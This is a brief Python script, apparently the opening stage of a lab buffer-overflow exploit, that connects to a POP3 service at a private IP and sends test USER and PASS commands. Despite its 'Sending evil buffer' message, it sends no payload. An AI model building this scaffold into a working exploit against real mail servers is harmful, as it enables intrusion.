#!/usr/bin/env python
import socket

if __name__ == '__main__':

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		print("\n[!] Sending evil buffer...")	
		sock.connect(('10.11.21.97', 110))		# connect to IP, POP3 port
		data = sock.recv(1024).decode("utf-8")	# receive banner
		print(data)								# print banner
		
		buff = ('USER test' + '\r\n').encode("utf-8")
		sock.send(buff)
		data = sock.recv(1024).decode("utf-8")
		print(data)

		buff = ('PASS test' + '\r\n').encode("utf-8")
		sock.send(buff)
		data = sock.recv(1024).decode("utf-8")
		print(data)

	except:
		print("[x] Something went wrong...")
	finally:
		sock.close()
		print("[*] Script Ran Successfully!")

		
